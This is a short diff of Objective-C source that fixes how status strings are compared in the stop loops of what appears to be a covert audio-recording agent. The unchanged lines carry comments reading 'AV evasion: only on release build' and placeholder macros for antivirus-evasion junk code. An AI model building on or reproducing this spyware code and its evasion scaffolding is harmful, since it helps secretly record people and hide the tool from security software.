@@ -910,8 +910,8 @@ void myInputAudioCallback(void                               *inUserData,
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  while ([mAgentConfiguration objectForKey: @"status"]  != AGENT_STOPPED
-         && internalCounter                             <= MAX_STOP_WAIT_TIME)
+    while (![[mAgentConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
+         && internalCounter <= MAX_STOP_WAIT_TIME)
     {
       internalCounter++;
       usleep(100000);
@@ -985,8 +985,8 @@ void myInputAudioCallback(void                               *inUserData,
   // AV evasion: only on release build
   AV_GARBAGE_004
   
-  while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
-         && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
+  while (![[mAgentConfiguration objectForKey: @"status"]     isEqual: AGENT_STOP]
+         && ![[mAgentConfiguration objectForKey: @"status"] isEqual: AGENT_STOPPED])
   {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
     
@@ -1039,7 +1039,7 @@ void myInputAudioCallback(void                               *inUserData,
   // AV evasion: only on release build
   AV_GARBAGE_003
   
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
+  if ([[mAgentConfiguration objectForKey: @"status"]  isEqual: AGENT_STOP])
   {      
     // AV evasion: only on release build
     AV_GARBAGE_004
